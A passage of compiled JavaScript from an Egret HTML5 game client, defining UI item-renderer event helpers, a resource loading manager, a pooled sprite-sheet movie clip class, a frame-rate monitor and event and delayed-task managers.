        if (thisObj === void 0) { thisObj = this; }
        this.addEvent(egret.TouchEvent.TOUCH_END, obj, func, thisObj);
    };
    BaseItemRender.prototype.removeEventTouchEnd = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.removeEvent(egret.TouchEvent.TOUCH_END, obj, func, thisObj);
    };
    BaseItemRender.prototype.addEventChange = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.addEvent(egret.TouchEvent.CHANGE, obj, func, thisObj);
    };
    BaseItemRender.prototype.removeEventChange = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.removeEvent(egret.TouchEvent.CHANGE, obj, func, thisObj);
    };
    BaseItemRender.prototype.addEventChanging = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.addEvent(egret.TouchEvent.CHANGING, obj, func, thisObj);
    };
    BaseItemRender.prototype.removeEventChanging = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.removeEvent(egret.TouchEvent.CHANGING, obj, func, thisObj);
    };
    BaseItemRender.prototype.addEventItemTap = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.addEvent(eui.ItemTapEvent.ITEM_TAP, obj, func, thisObj);
    };
    BaseItemRender.prototype.removeEventItemTap = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.removeEvent(eui.ItemTapEvent.ITEM_TAP, obj, func, thisObj);
    };
    BaseItemRender.prototype.addEventAddedFromStage = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.addEvent(egret.Event.ADDED_TO_STAGE, obj, func, thisObj);
    };
    BaseItemRender.prototype.removeEventAddedFromStage = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.removeEvent(egret.Event.ADDED_TO_STAGE, obj, func, thisObj);
    };
    BaseItemRender.prototype.addEventRemovedFromStage = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.addEvent(egret.Event.REMOVED_FROM_STAGE, obj, func, thisObj);
    };
    BaseItemRender.prototype.removeEventRemovedFromStage = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.removeEvent(egret.Event.REMOVED_FROM_STAGE, obj, func, thisObj);
    };
    BaseItemRender.prototype.addEventTextLink = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.addEvent(egret.TextEvent.LINK, obj, func, thisObj);
    };
    BaseItemRender.prototype.removeEventTextLink = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.removeEvent(egret.TextEvent.LINK, obj, func, thisObj);
    };
    BaseItemRender.prototype.addEventFocusIn = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.addEvent(egret.FocusEvent.FOCUS_IN, obj, func, thisObj);
    };
    BaseItemRender.prototype.removeEventFocusIn = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.removeEvent(egret.FocusEvent.FOCUS_IN, obj, func, thisObj);
    };
    BaseItemRender.prototype.addEventFocusOut = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.addEvent(egret.FocusEvent.FOCUS_OUT, obj, func, thisObj);
    };
    BaseItemRender.prototype.removeEventFocusOut = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.removeEvent(egret.FocusEvent.FOCUS_OUT, obj, func, thisObj);
    };
    BaseItemRender.prototype.addEventTouchBegin = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.addEvent(egret.TouchEvent.TOUCH_BEGIN, obj, func, thisObj);
    };
    BaseItemRender.prototype.removeEventTouchBegin = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.removeEvent(egret.TouchEvent.TOUCH_BEGIN, obj, func, thisObj);
    };
    BaseItemRender.prototype.addEventTouchMove = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.addEvent(egret.TouchEvent.TOUCH_MOVE, obj, func, thisObj);
    };
    BaseItemRender.prototype.removeEventTouchMove = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.removeEvent(egret.TouchEvent.TOUCH_MOVE, obj, func, thisObj);
    };
    BaseItemRender.prototype.addEventChangeStart = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.addEvent(eui.UIEvent.CHANGE_START, obj, func, thisObj);
    };
    BaseItemRender.prototype.removeEventChangeStart = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.removeEvent(eui.UIEvent.CHANGE_START, obj, func, thisObj);
    };
    BaseItemRender.prototype.addEventChangeEnd = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.addEvent(eui.UIEvent.CHANGE_END, obj, func, thisObj);
    };
    BaseItemRender.prototype.removeEventChangeEnd = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.removeEvent(eui.UIEvent.CHANGE_END, obj, func, thisObj);
    };
    BaseItemRender.prototype.destruct = function () {
    };
    return BaseItemRender;
}(eui.ItemRenderer));
__reflect(BaseItemRender.prototype, "BaseItemRender", ["IBaseEvent"]);
var BaseLayer = (function (_super) {
    __extends(BaseLayer, _super);
    function BaseLayer() {
        var _this = _super.call(this) || this;
        _this.percentWidth = 100;
        _this.percentHeight = 100;
        _this.touchEnabled = false;
        return _this;
    }
    BaseLayer.prototype.setSafeArea = function () {
    };
    return BaseLayer;
}(eui.Group));
__reflect(BaseLayer.prototype, "BaseLayer");
var BaseLeakDisplay = (function (_super) {
    __extends(BaseLeakDisplay, _super);
    function BaseLeakDisplay() {
        return _super !== null && _super.apply(this, arguments) || this;
    }
    return BaseLeakDisplay;
}(egret.DisplayObjectContainer));
__reflect(BaseLeakDisplay.prototype, "BaseLeakDisplay");
var RES;
(function (RES) {
    function nameSelector(url) {
        return RES.path.basename(url).split(".").join("_");
    }
    RES.nameSelector = nameSelector;
    function typeSelector(path) {
        var ext = path.substr(path.lastIndexOf(".") + 1);
        var type;
        switch (ext) {
            case RES.ResourceItem.TYPE_XML:
            case RES.ResourceItem.TYPE_JSON:
            case RES.ResourceItem.TYPE_SHEET:
                type = ext;
                break;
            case "png":
            case "jpg":
            case "gif":
            case "jpeg":
            case "bmp":
                type = RES.ResourceItem.TYPE_IMAGE;
                break;
            case "fnt":
                type = RES.ResourceItem.TYPE_FONT;
                break;
            case "txt":
                type = RES.ResourceItem.TYPE_TEXT;
                break;
            case "mp3":
            case "ogg":
            case "mpeg":
            case "wav":
            case "m4a":
            case "mp4":
            case "aiff":
            case "wma":
            case "mid":
                type = RES.ResourceItem.TYPE_SOUND;
                break;
            case "mergeJson":
            case "zip":
            case "pvr":
                type = ext;
                break;
            case "ttf":
                type = RES.ResourceItem.TYPE_TTF;
            default:
                type = RES.ResourceItem.TYPE_BIN;
                break;
        }
        return type;
    }
    RES.typeSelector = typeSelector;
    function registerAnalyzer(type, analyzerClass) {
        throw new RES.ResourceManagerError(2002);
    }
    RES.registerAnalyzer = registerAnalyzer;
    function setIsCompatible(value) {
        RES.isCompatible = value;
    }
    RES.setIsCompatible = setIsCompatible;
    RES.isCompatible = false;
    function loadConfig(url, resourceRoot) {
        if (resourceRoot.indexOf('://') >= 0) {
            var temp = resourceRoot.split('://');
            resourceRoot = temp[0] + '://' + RES.path.normalize(temp[1] + '/');
            url = url.replace(resourceRoot, '');
        }
        else {
            resourceRoot = RES.path.normalize(resourceRoot + "/");
            url = url.replace(resourceRoot, '');
        }
        RES.setConfigURL(url, resourceRoot);
        if (!instance)
            instance = new Resource();
        return compatiblePromise(instance.loadConfig());
    }
    RES.loadConfig = loadConfig;
    function compatiblePromise(promise) {
        if (RES.isCompatible) {
            promise.catch(function (e) { }).then();
            return undefined;
        }
        else {
            return promise;
        }
    }
    function loadGroup(name, priority, reporter) {
        if (priority === void 0) { priority = 0; }
        return compatiblePromise(instance.loadGroup(name, priority, reporter));
    }
    RES.loadGroup = loadGroup;
    function isGroupLoaded(name) {
        return instance.isGroupLoaded(name);
    }
    RES.isGroupLoaded = isGroupLoaded;
    function getGroupByName(name) {
        return instance.getGroupByName(name).map(function (r) { return RES.ResourceItem.convertToResItem(r); });
    }
    RES.getGroupByName = getGroupByName;
    function createGroup(name, keys, override) {
        if (override === void 0) { override = false; }
        return instance.createGroup(name, keys, override);
    }
    RES.createGroup = createGroup;
    function hasRes(key) {
        return instance.hasRes(key);
    }
    RES.hasRes = hasRes;
    function getRes(key) {
        return instance.getRes(key);
    }
    RES.getRes = getRes;
    function getResAsync(key, compFunc, thisObject) {
        return compatiblePromise(instance.getResAsync.apply(instance, arguments));
    }
    RES.getResAsync = getResAsync;
    function getResByUrl(url, compFunc, thisObject, type) {
        if (type === void 0) { type = ""; }
        if (!instance) {
            var message = egret.sys.tr(3200);
            egret.warn(message);
            return Promise.reject(message);
        }
        return compatiblePromise(instance.getResByUrl(url, compFunc, thisObject, type));
    }
    RES.getResByUrl = getResByUrl;
    function destroyRes(name, force) {
        return instance.destroyRes(name, force);
    }
    RES.destroyRes = destroyRes;
    function setMaxLoadingThread(thread) {
        if (!instance)
            instance = new Resource();
        instance.setMaxLoadingThread(thread);
    }
    RES.setMaxLoadingThread = setMaxLoadingThread;
    function setMaxRetryTimes(retry) {
        instance.setMaxRetryTimes(retry);
    }
    RES.setMaxRetryTimes = setMaxRetryTimes;
    function addEventListener(type, listener, thisObject, useCapture, priority) {
        if (useCapture === void 0) { useCapture = false; }
        if (priority === void 0) { priority = 0; }
        if (!instance)
            instance = new Resource();
        instance.addEventListener(type, listener, thisObject, useCapture, priority);
    }
    RES.addEventListener = addEventListener;
    function removeEventListener(type, listener, thisObject, useCapture) {
        if (useCapture === void 0) { useCapture = false; }
        instance.removeEventListener(type, listener, thisObject, useCapture);
    }
    RES.removeEventListener = removeEventListener;
    function $addResourceData(data) {
        instance.addResourceData(data);
    }
    RES.$addResourceData = $addResourceData;
    function getVersionController() {
        if (!instance)
            instance = new Resource();
        return instance.vcs;
    }
    RES.getVersionController = getVersionController;
    function registerVersionController(vcs) {
        if (!instance)
            instance = new Resource();
        instance.registerVersionController(vcs);
    }
    RES.registerVersionController = registerVersionController;
    function getVirtualUrl(url) {
        if (instance.vcs) {
            return instance.vcs.getVirtualUrl(url);
        }
        else {
            return url;
        }
    }
    RES.getVirtualUrl = getVirtualUrl;
    var Resource = (function (_super) {
        __extends(Resource, _super);
        function Resource() {
            var _this = _super.call(this) || this;
            _this.isVcsInit = false;
            _this.normalLoadConfig = function () {
                return RES.config.init().then(function (data) {
                    RES.ResourceEvent.dispatchResourceEvent(_this, RES.ResourceEvent.CONFIG_COMPLETE);
                }, function (error) {
                    RES.ResourceEvent.dispatchResourceEvent(_this, RES.ResourceEvent.CONFIG_LOAD_ERROR);
                    return Promise.reject(error);
                });
            };
            if (RES.VersionController) {
                _this.vcs = new RES.VersionController();
            }
            return _this;
        }
        Resource.prototype.registerVersionController = function (vcs) {
            this.vcs = vcs;
            this.isVcsInit = false;
        };
        Resource.prototype.loadConfig = function () {
            var _this = this;
            if (!this.isVcsInit && this.vcs) {
                this.isVcsInit = true;
                return this.vcs.init().then(function () {
                    return _this.normalLoadConfig();
                });
            }
            else {
                return this.normalLoadConfig();
            }
        };
        Resource.prototype.isGroupLoaded = function (name) {
            var resources = RES.config.getGroupByName(name);
            return resources.every(function (r) { return RES.host.get(r) != null; });
        };
        Resource.prototype.getGroupByName = function (name) {
            return RES.config.getGroupByName(name);
        };
        Resource.prototype.loadGroup = function (name, priority, reporter) {
            var _this = this;
            if (priority === void 0) { priority = 0; }
            var reporterDelegate = {
                onProgress: function (current, total, resItem) {
                    if (reporter && reporter.onProgress) {
                        reporter.onProgress(current, total, resItem);
                    }
                    RES.ResourceEvent.dispatchResourceEvent(_this, RES.ResourceEvent.GROUP_PROGRESS, name, resItem, current, total);
                }
            };
            return this._loadGroup(name, priority, reporterDelegate).then(function (data) {
                if (RES.config.config.loadGroup.indexOf(name) == -1) {
                    RES.config.config.loadGroup.push(name);
                }
                RES.ResourceEvent.dispatchResourceEvent(_this, RES.ResourceEvent.GROUP_COMPLETE, name);
            }, function (error) {
                if (RES.config.config.loadGroup.indexOf(name) == -1) {
                    RES.config.config.loadGroup.push(name);
                }
                if (error.itemList) {
                    var itemList = error.itemList;
                    var length_1 = itemList.length;
                    for (var i = 0; i < length_1; i++) {
                        var item = itemList[i];
                        delete item.promise;
                        RES.ResourceEvent.dispatchResourceEvent(_this, RES.ResourceEvent.ITEM_LOAD_ERROR, name, item);
                    }
                }
                if (RES.isCompatible) {
                    console.warn(error.error.message);
                }
                RES.ResourceEvent.dispatchResourceEvent(_this, RES.ResourceEvent.GROUP_LOAD_ERROR, name);
                return Promise.reject(error.error);
            });
        };
        Resource.prototype._loadGroup = function (name, priority, reporter) {
            if (priority === void 0) { priority = 0; }
            var resources = RES.config.getGroupByName(name);
            if (resources.length == 0) {
                return new Promise(function (resolve, reject) {
                    reject({ error: new RES.ResourceManagerError(2005, name) });
                });
            }
            return RES.queue.pushResGroup(resources, name, priority, reporter);
        };
        Resource.prototype.createGroup = function (name, keys, override) {
            if (override === void 0) { override = false; }
            return RES.config.createGroup(name, keys, override);
        };
        Resource.prototype.hasRes = function (key) {
            return RES.config.getResourceWithSubkey(key) != null;
        };
        Resource.prototype.getRes = function (resKey) {
            var result = RES.config.getResourceWithSubkey(resKey);
            if (result) {
                var r = result.r;
                var key = result.key;
                var subkey = result.subkey;
                var p = RES.processor.isSupport(r);
                if (p && p.getData && subkey) {
                    return p.getData(RES.host, r, key, subkey);
                }
                else {
                    return RES.host.get(r);
                }
            }
            else {
                return null;
            }
        };
        Resource.prototype.getResAsync = function (key, compFunc, thisObject) {
            var _this = this;
            var paramKey = key;
            var tempResult = RES.config.getResourceWithSubkey(key);
            if (tempResult == null) {
                if (compFunc) {
                    compFunc.call(thisObject, null, paramKey);
                }
                return Promise.reject(new RES.ResourceManagerError(2006, key));
            }
            var data = this.getRes(key);
            if (data) {
                if (compFunc) {
                    egret.callLater(function () {
                        compFunc.call(thisObject, data, paramKey);
                    }, this);
                }
                return Promise.resolve(data);
            }
            var r = tempResult.r, subkey = tempResult.subkey;
            return RES.queue.pushResItem(r).then(function (value) {
                RES.host.save(r, value);
                var p = RES.processor.isSupport(r);
                if (p && p.getData && subkey) {
                    value = p.getData(RES.host, r, key, subkey);
                }
                if (compFunc) {
                    compFunc.call(thisObject, value, paramKey);
                }
                return value;
            }, function (error) {
                RES.host.remove(r);
                RES.ResourceEvent.dispatchResourceEvent(_this, RES.ResourceEvent.ITEM_LOAD_ERROR, "", r);
                if (compFunc) {
                    compFunc.call(thisObject, null, paramKey);
                    return Promise.reject(null);
                }
                return Promise.reject(error);
            });
        };
        Resource.prototype.getResByUrl = function (url, compFunc, thisObject, type) {
            var _this = this;
            if (type === void 0) { type = ""; }
            var r = RES.config.getResource(url);
            if (!r) {
                if (!type) {
                    type = RES.config.__temp__get__type__via__url(url);
                }
                r = { name: url, url: url, type: type, root: '', extra: 1 };
                RES.config.addResourceData(r);
                r = RES.config.getResource(url);
                if (!r) {
                    throw 'never';
                }
            }
            return RES.queue.pushResItem(r).then(function (value) {
                RES.host.save(r, value);
                if (compFunc && r) {
                    compFunc.call(thisObject, value, r.url);
                }
                return value;
            }, function (error) {
                RES.host.remove(r);
                RES.ResourceEvent.dispatchResourceEvent(_this, RES.ResourceEvent.ITEM_LOAD_ERROR, "", r);
                if (compFunc) {
                    compFunc.call(thisObject, null, url);
                    return Promise.reject(null);
                }
                return Promise.reject(error);
            });
        };
        Resource.prototype.destroyRes = function (name, force) {
            if (force === void 0) { force = true; }
            var group = RES.config.getGroupByName(name);
            if (group && group.length > 0) {
                var index = RES.config.config.loadGroup.indexOf(name);
                if (index == -1) {
                    return false;
                }
                if (force || (RES.config.config.loadGroup.length == 1 && RES.config.config.loadGroup[0] == name)) {
                    for (var _i = 0, group_2 = group; _i < group_2.length; _i++) {
                        var item = group_2[_i];
                        RES.queue.unloadResource(item);
                    }
                    RES.config.config.loadGroup.splice(index, 1);
                }
                else {
                    var removeItemHash = {};
                    for (var _a = 0, _b = RES.config.config.loadGroup; _a < _b.length; _a++) {
                        var groupName = _b[_a];
                        for (var key in RES.config.config.groups[groupName]) {
                            var tmpname = RES.config.config.groups[groupName][key];
                            if (removeItemHash[tmpname]) {
                                removeItemHash[tmpname]++;
                            }
                            else {
                                removeItemHash[tmpname] = 1;
                            }
                        }
                    }
                    for (var _c = 0, group_3 = group; _c < group_3.length; _c++) {
                        var item = group_3[_c];
                        if (removeItemHash[item.name] && removeItemHash[item.name] == 1) {
                            RES.queue.unloadResource(item);
                        }
                    }
                    RES.config.config.loadGroup.splice(index, 1);
                }
                return true;
            }
            else {
                var item = RES.config.getResource(name);
                if (item) {
                    return RES.queue.unloadResource(item);
                }
                else {
                    console.warn("\u5728\u5185\u5B58" + name + "\u8D44\u6E90\u4E0D\u5B58\u5728");
                    return false;
                }
            }
        };
        Resource.prototype.setMaxLoadingThread = function (thread) {
            if (thread < 1) {
                thread = 1;
            }
            RES.queue.thread = thread;
        };
        Resource.prototype.setMaxRetryTimes = function (retry) {
            retry = Math.max(retry, 0);
            RES.queue.maxRetryTimes = retry;
        };
        Resource.prototype.addResourceData = function (data) {
            data["root"] = '';
            RES.config.addResourceData(data);
        };
        __decorate([
            RES.checkNull
        ], Resource.prototype, "hasRes", null);
        __decorate([
            RES.checkNull
        ], Resource.prototype, "getRes", null);
        __decorate([
            RES.checkNull
        ], Resource.prototype, "getResAsync", null);
        __decorate([
            RES.checkNull
        ], Resource.prototype, "getResByUrl", null);
        return Resource;
    }(egret.EventDispatcher));
    RES.Resource = Resource;
    __reflect(Resource.prototype, "RES.Resource");
    var instance;
})(RES || (RES = {}));
var GameMovieClip = (function (_super) {
    __extends(GameMovieClip, _super);
    function GameMovieClip() {
        var _this = _super.call(this) || this;
        _this._rate = 1;
        _this.pixelHitTest = false;
        _this.$hitTest = function (stageX, stageY) {
            if (!this.$renderNode || !this.$visible) {
                return null;
            }
            var m = this.$getInvertedConcatenatedMatrix();
            if (m.a == 0 && m.b == 0 && m.c == 0 && m.d == 0) {
                return null;
            }
            var bounds = this.$getContentBounds();
            var localX = m.a * stageX + m.c * stageY + m.tx;
            var localY = m.b * stageX + m.d * stageY + m.ty;
            if (bounds.contains(localX, localY)) {
                if (!this.$children) {
                    var rect = this.$scrollRect ? this.$scrollRect : this.$maskRect;
                    if (rect && !rect.contains(localX, localY)) {
                        return null;
                    }
                    if (this.$mask && !this.$mask.$hitTest(stageX, stageY)) {
                        return null;
                    }
                    if (this.pixelHitTest && this instanceof GameMovieClip && !this.hitTestPoint(stageX, stageY, true)) {
                        return null;
                    }
                }
                return this;
            }
            return null;
        };
        return _this;
    }
    GameMovieClip.prototype.playFile = function (name, playCount, compFun, remove) {
        var _this = this;
        if (playCount === void 0) { playCount = 1; }
        if (compFun === void 0) { compFun = null; }
        if (remove === void 0) { remove = true; }
        this.time = egret.getTimer();
        this._compFun = compFun;
        this.playCount = playCount;
        this.remove = remove;
        TimerMgr.ins().remove(this.playComp, this);
        if (this.texture && this.texture.bitmapData == null) {
        }
        else if (this.name == name) {
            this.createBody();
            return;
        }
        this.name = name;
        if (this.texture) {
            GameMovieClip.removeDisplayObject(this, this.texture.bitmapData);
        }
        this.jsonData = null;
        this.texture = null;
        RES.getResByUrl(this.name + ".json", function (data, url) {
            if (_this.name + ".json" != url || !data) {
                return;
            }
            _this.jsonData = data;
            _this.createBody();
        }, this, RES.ResourceItem.TYPE_JSON);
        RES.getResByUrl(this.name + ".png", function (data, url) {
            if (_this.name + ".png" != url || !data) {
                return;
            }
            _this.texture = data;
            if (_this.stage) {
                GameMovieClip.addDisplayObject(_this, _this.texture.bitmapData);
            }
            _this.createBody();
        }, this, RES.ResourceItem.TYPE_IMAGE);
    };
    GameMovieClip.prototype.$onAddToStage = function (stage, nestLevel) {
        _super.prototype.$onAddToStage.call(this, stage, nestLevel);
        if (this.texture) {
            GameMovieClip.addDisplayObject(this, this.texture.bitmapData);
        }
    };
    GameMovieClip.prototype.$onRemoveFromStage = function () {
        _super.prototype.$onRemoveFromStage.call(this);
        if (this.texture) {
            GameMovieClip.removeDisplayObject(this, this.texture.bitmapData);
        }
    };
    GameMovieClip.prototype.createBody = function () {
        if (this.jsonData && this.texture && this.texture.bitmapData) {
            var temp = this.name.split("/");
            var tempName = temp.pop();
            var mcFactory = this.getMcFactory();
            this.movieClipData = mcFactory.generateMovieClipData(tempName);
            if (!(this.name in GameMovieClip.originalRate)) {
                GameMovieClip.originalRate[this.name] = this.movieClipData.frameRate;
            }
            this.frameRate = (GameMovieClip.originalRate[this.name] * this.rate) >> 0;
            try {
                this.gotoAndPlay(1, this.playCount);
            }
            catch (error) {
                debug.error("error mc:", this.name);
            }
            this.visible = true;
            if (this.playCount > 0) {
                var tempTime = egret.getTimer() - this.time;
                tempTime = this.playTime * this.playCount - tempTime;
                if (tempTime > 0) {
                    TimerMgr.ins().doTimer(tempTime, 1, this.playComp, this);
                }
                else {
                    this.playComp();
                }
            }
            this.dispatchEventWith(egret.Event.CHANGE);
        }
    };
    GameMovieClip.prototype.getMcFactory = function () {
        var hashCode = this.texture.bitmapData.hashCode;
        if (GameMovieClip.factoryDic[hashCode]) {
            return GameMovieClip.factoryDic[hashCode];
        }
        var movieClipDataFactory = new egret.MovieClipDataFactory;
        movieClipDataFactory.mcDataSet = this.jsonData;
        movieClipDataFactory.texture = this.texture;
        GameMovieClip.factoryDic[hashCode] = movieClipDataFactory;
        return movieClipDataFactory;
    };
    GameMovieClip.prototype.playComp = function () {
        if (this.stage && this._compFun) {
            this._compFun();
        }
        if (this.remove) {
            if (this && this.parent != null) {
                this.parent.removeChild(this);
            }
        }
    };
    Object.defineProperty(GameMovieClip.prototype, "playTime", {
        get: function () {
            if (!this.movieClipData)
                return 0;
            return 1 / this.frameRate * this.totalFrames * 1000;
        },
        enumerable: true,
        configurable: true
    });
    GameMovieClip.prototype.clearComFun = function () {
        this._compFun = null;
    };
    GameMovieClip.prototype.dispose = function () {
        this.stop();
        this.resetMovieClip();
        this.clearComFun();
        TimerMgr.ins().removeAll(this);
    };
    GameMovieClip.prototype.destroy = function () {
        if (this && this.parent != null) {
            this.parent.removeChild(this);
        }
        this.dispose();
        ObjectPool.push(this);
    };
    GameMovieClip.prototype.resetMovieClip = function () {
        var mc = this;
        mc.rotation = 0;
        mc.scaleX = 1;
        mc.scaleY = 1;
        mc.alpha = 1;
        mc.anchorOffsetX = 0;
        mc.anchorOffsetY = 0;
        mc.x = 0;
        mc.y = 0;
        mc.rate = 1;
        mc.$renderNode && mc.$renderNode.cleanBeforeRender();
        mc.$nativeDisplayObject && mc.$nativeDisplayObject.setDataToBitmapNode && mc.$nativeDisplayObject.setDataToBitmapNode(0, null, []);
        mc.name = null;
        mc.jsonData = null;
        mc.filters = null;
        var bitmapData = mc.texture;
        if (bitmapData) {
            GameMovieClip.removeDisplayObject(mc, bitmapData.bitmapData);
        }
        mc.texture = null;
        mc.remove = false;
        mc.visible = false;
        egret.Tween.removeTweens(mc);
    };
    GameMovieClip.addDisplayObject = function (displayObject, bitmapData) {
        if (!bitmapData)
            return;
        var hashCode = bitmapData.hashCode;
        if (!GameMovieClip.displayList[hashCode]) {
            GameMovieClip.displayList[hashCode] = [displayObject];
            return;
        }
        var tempList = GameMovieClip.displayList[hashCode];
        if (tempList.indexOf(displayObject) < 0) {
            tempList.push(displayObject);
        }
    };
    GameMovieClip.removeDisplayObject = function (displayObject, bitmapData) {
        if (!bitmapData)
            return;
        var hashCode = bitmapData.hashCode;
        if (!GameMovieClip.displayList[hashCode]) {
            return;
        }
        var tempList = GameMovieClip.displayList[hashCode];
        var index = tempList.indexOf(displayObject);
        if (index >= 0) {
            tempList.splice(index, 1);
        }
        if (tempList.length == 0) {
            delete GameMovieClip.displayList[hashCode];
            RecycleMgr.ins().disposeResTime(hashCode);
        }
    };
    Object.defineProperty(GameMovieClip.prototype, "rate", {
        get: function () {
            return this._rate * (DataCenter.ins().ClientGlobalConfig.actionSpeedRate || 1);
        },
        set: function (val) {
            this._rate = val;
        },
        enumerable: true,
        configurable: true
    });
    GameMovieClip.originalRate = {};
    GameMovieClip.factoryDic = {};
    GameMovieClip.displayList = egret.createMap();
    return GameMovieClip;
}(egret.MovieClip));
__reflect(GameMovieClip.prototype, "GameMovieClip");
var FrameSurveillance = (function (_super) {
    __extends(FrameSurveillance, _super);
    function FrameSurveillance() {
        var _this = _super.call(this) || this;
        _this.totalTick = 0;
        _this.curTime = 0;
        _this.totalTime = 0;
        _this.lastLevel = 0;
        _this.curTime = egret.getTimer();
        egret.startTick(_this.callBack, _this);
        return _this;
    }
    FrameSurveillance.ins = function () {
        return _super.ins.call(this);
    };
    FrameSurveillance.prototype.callBack = function (timeStamp) {
        this.totalTick++;
        this.totalTime += timeStamp - this.curTime;
        this.curTime = timeStamp;
        if (this.totalTime >= 5000) {
            var frameRate = egret.ticker.$frameRate;
            var curFps = Math.min(Math.ceil(this.totalTick * 1000 / this.totalTime), frameRate);
            if (!this.levelInterval) {
                this.levelInterval = [];
                for (var i = 1; i <= 3; i++) {
                    this.levelInterval.push((1 - i * 0.2) * frameRate >> 0);
                }
            }
            var curLevel = 0;
            for (var i = 0; i < this.levelInterval.length; i++) {
                if (curFps >= this.levelInterval[i]) {
                    curLevel = i;
                    break;
                }
            }
            this.updateLevel(curLevel);
            this.totalTick = 0;
            this.totalTime = this.totalTime % 1000;
        }
        return false;
    };
    FrameSurveillance.prototype.updateLevel = function (curLevel) {
        if (curLevel != this.lastLevel) {
            this.lastLevel = curLevel;
            EventMgr.ins().dispatch(5, curLevel);
        }
    };
    return FrameSurveillance;
}(SingleClass));
__reflect(FrameSurveillance.prototype, "FrameSurveillance");
var GameSystem;
(function (GameSystem) {
    GameSystem.frameSurveillance = FrameSurveillance.ins.bind(FrameSurveillance);
})(GameSystem || (GameSystem = {}));
var DelayOptMgr = (function (_super) {
    __extends(DelayOptMgr, _super);
    function DelayOptMgr() {
        var _this = _super.call(this) || this;
        _this._delayTime = 2;
        _this._delayOpts = [];
        egret.startTick(_this.run, _this);
        return _this;
    }
    DelayOptMgr.ins = function () {
        return _super.ins.call(this);
    };
    DelayOptMgr.prototype.run = function (time) {
        if (this._delayOpts.length == 0) {
            return false;
        }
        var timeFlag = egret.getTimer();
        var funObj;
        while (this._delayOpts.length) {
            funObj = this._delayOpts.shift();
            if (funObj.funPara)
                funObj.fun.call(funObj.thisObj, funObj.funPara);
            else
                funObj.fun.call(funObj.thisObj);
            if (funObj.callBack) {
                if (funObj.para != undefined)
                    funObj.callBack.call(funObj.thisObj, funObj.para);
                else
                    funObj.callBack();
            }
            if (egret.getTimer() - timeFlag > this._delayTime)
                break;
        }
        return false;
    };
    DelayOptMgr.prototype.addDelayOptFunction = function (thisObj, fun, funPara, callBack, para) {
        this._delayOpts.push({ "fun": fun, "funPara": funPara, "thisObj": thisObj, "callBack": callBack, "para": para });
    };
    DelayOptMgr.prototype.clear = function () {
        this._delayOpts.length = 0;
    };
    return DelayOptMgr;
}(SingleClass));
__reflect(DelayOptMgr.prototype, "DelayOptMgr");
var EventMgr = (function (_super) {
    __extends(EventMgr, _super);
    function EventMgr() {
        var _this = _super.call(this) || this;
        _this.flag = 0;
        _this.dict = {};
        _this.eVec = [];
        egret.startTick(_this.run, _this);
        return _this;
    }
    EventMgr.ins = function () {
        return _super.ins.call(this);
    };
    EventMgr.addListener = function (type, listener, thisObj) {
        var key = "" + type;
        if (key) {
            EventMgr.ins().addListener(key, listener, thisObj);
        }
        else {
            debug.log("EventMgr.addListener error:" + egret.getQualifiedClassName(thisObj));
        }
    };
    EventMgr.prototype.addListener = function (key, listener, thisObj) {
        var arr = this.dict[key];
        if (!arr) {
            this.dict[key] = arr = [];
        }
        else if (this.flag != 0) {
            this.dict[key] = arr = arr.concat();
        }
        for (var _i = 0, arr_1 = arr; _i < arr_1.length; _i++) {
            var item = arr_1[_i];
            if (item[0] == listener && item[1] == thisObj) {
                return;
            }
        }
        arr.push([listener, thisObj]);
    };
    EventMgr.prototype.dispatch = function (type) {
        var param = [];
        for (var _i = 1; _i < arguments.length; _i++) {
            param[_i - 1] = arguments[_i];
        }
        var key = "" + type;
        var vo = ObjectPool.pop("EventVo");
        vo.key = key;
        vo.param = param;
        this.eVec.push(vo);
    };
    EventMgr.removeListener = function (type, listener, thisObj) {
        var key = "" + type;
        if (key) {
            EventMgr.ins().removeListener(key, listener, thisObj);
        }
        else {
            debug.log("EventMgr.removeListener error:" + egret.getQualifiedClassName(thisObj));
        }
    };
    EventMgr.prototype.removeListener = function (key, listener, thisObj) {
        var arr = this.dict[key];
        if (!arr) {
            return;
        }
        if (this.flag != 0) {
            this.dict[key] = arr = arr.concat();
        }
        var len = arr.length;
        for (var i = 0; i < len; i++) {
            if (arr[i][0] == listener && arr[i][1] == thisObj) {
                arr.splice(i, 1);
                break;
            }
        }
        if (arr.length == 0) {
            this.dict[key] = null;
            delete this.dict[key];
        }
    };
    EventMgr.prototype.removeAll = function (thisObj, keys) {
        if (!keys) {
            keys = Object.keys(this.dict);
        }
        for (var _i = 0, keys_2 = keys; _i < keys_2.length; _i++) {
            var key = keys_2[_i];
            var arr = this.dict[key];
            if (this.flag != 0) {
                this.dict[key] = arr = arr.concat();
            }
            var length_2 = arr ? arr.length : 0;
            for (var i = length_2 - 1; i >= 0; i--) {
                if (arr[i][1] == thisObj) {
                    arr.splice(i, 1);
                }
            }
            if (!arr || arr.length == 0) {
                this.dict[key] = null;
